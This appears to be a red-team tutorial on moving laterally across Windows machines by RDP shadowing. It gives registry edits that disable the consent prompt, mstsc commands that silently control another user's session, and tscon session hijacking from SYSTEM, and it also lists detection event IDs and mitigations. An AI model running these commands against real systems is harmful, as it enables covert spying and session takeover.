# Windows Lateral Movement via RDP Shadowing

Using RDP Shadowing to silently view and control other users' RDP sessions.

## Prerequisites

- Admin privileges on the target
- RDP enabled on target
- Target must have an active RDP session

## Enable Shadowing via Registry

```powershell
# Set shadowing to allow full control without user consent
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" `
  -Name "Shadow" -Value 2

# Values:
# 0 = No shadowing
# 1 = Full control with user consent
# 2 = Full control without user consent
# 3 = View only with user consent
# 4 = View only without user consent

# Allow shadowing via GPO
gpupdate /force
```

## Shadow a Session

```powershell
# List active RDP sessions
query user
# Output:
#  USERNAME SESSIONNAME  ID  STATE   IDLE TIME  LOGON TIME
#  admin    rdp-tcp#0     2  Active  .          6/23/2026

# Shadow session ID 2 without consent (requires value=2 in registry)
mstsc /shadow:2 /v:10.10.10.10 /control /noConsentPrompt

# View only (no control)
mstsc /shadow:2 /v:10.10.10.10 /noConsentPrompt
```

## Remote Shadowing (from another machine)

```powershell
# Need to enable remote shadowing first
# On target machine (via psexec/wmiexec):
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v ShadowOnNoConsent /t REG_DWORD /d 1 /f

# Then from attacker machine:
mstsc /shadow:2 /v:10.10.10.10 /control /noConsentPrompt
```

## Detection Considerations

```powershell
# Event ID 20502: Shadow view started
# Event ID 20503: Shadow view ended
# Event ID 20506: Shadow control started
# Event ID 20507: Shadow control ended

# Check for shadow connections
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" |
  Where-Object {$_.Id -in 20502,20503,20506,20507} |
  Format-Table TimeCreated, Id, Message
```

## Alternative: tscon (session switching)

```powershell
# If you have SYSTEM, you can connect to any session
# Get session IDs
query session

# Connect to session 2 as SYSTEM (no password needed)
tscon 2 /dest:console

# This switches the console to session 2
# Useful when you have a SYSTEM shell via service exploit
```

## Mitigation

- Disable RDP Shadowing via GPO:
  - Computer Configuration > Admin Templates > Windows Components >
    Remote Desktop Services > Remote Desktop Session Host > Connections
  - Set "Set rules for remote control of Remote Desktop Services user sessions" to "No remote control allowed"

- Monitor Event IDs 20502-20507
- Restrict RDP access to specific admin workstations
- Use RDP gateways with session logging
